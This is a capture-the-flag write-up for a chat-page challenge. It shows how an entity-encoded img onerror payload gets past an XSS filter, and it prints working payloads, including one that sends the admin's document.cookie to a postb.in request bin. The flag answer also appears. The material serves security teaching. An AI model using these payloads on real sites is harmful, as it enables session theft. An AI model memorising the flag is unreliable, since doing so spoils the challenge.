![](./images/logo.png)

We're initially provided with a webpage including a cauliflower video and a chat system.

![](./images/start.png)

With the name of the challenge as a hint, we may be tasked with stealing cookies. This suggests XSS (Cross Site Scripting) will be involved. 

The first thing to try is classic XSS payload:

```html
<script>
    alert('xss')
</script>
```
This will display a pop-up with the text `XSS` if the website is vulnerable.

This, however, gets filtered out by the system:

![](./images/hacker.png)

We're going to have to be clever about this.

Using the [OWASP XSS Cheat sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). We can try and circumvent the check.

After some trial and error we come across the payload:

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

When executed it is decoded as:
```html
<img src=x onerror="javascript:alert('XSS')">
```

Writing a quick python script to encode this gives us the ability to make custom XSS exploits that will pass the filter.

To steal the cookie, we're going to use a "request bin" this will absorb and record all values sent to it.

Using the link to the newly initialized request bin, we can form the payload:
```javascript
javascript:document.location='https://postb.in/1561312937795-3777385130524?cookie='+document.cookie;
```
This will take all the values stored in cookies and send them to the url. This will allows us to view the values of all cookies.

And when encoded gives us this unit:
```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000100&#0000111&#0000099&#0000117&#0000109&#0000101&#0000110&#0000116&#0000046&#0000108&#0000111&#0000099&#0000097&#0000116&#0000105&#0000111&#0000110&#0000061&#0000039&#0000104&#0000116&#0000116&#0000112&#0000115&#0000058&#0000047&#0000047&#0000112&#0000111&#0000115&#0000116&#0000098&#0000046&#0000105&#0000110&#0000047&#0000049&#0000053&#0000054&#0000049&#0000051&#0000049&#0000050&#0000057&#0000051&#0000055&#0000055&#0000057&#0000053&#0000045&#0000051&#0000055&#0000055&#0000055&#0000051&#0000056&#0000053&#0000049&#0000051&#0000048&#0000053&#0000050&#0000052&#0000063&#0000099&#0000111&#0000111&#0000107&#0000105&#0000101&#0000061&#0000039&#0000043&#0000100&#0000111&#0000099&#0000117&#0000109&#0000101&#0000110&#0000116&#0000046&#0000099&#0000111&#0000111&#0000107&#0000105&#0000101&#0000059">
```

That when entered will re-direct your own page as well as the admins.

This will provide this output in the request bin

![](./images/flag.png)

Thus, giving us the flag!

FLAG:
```
CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}
```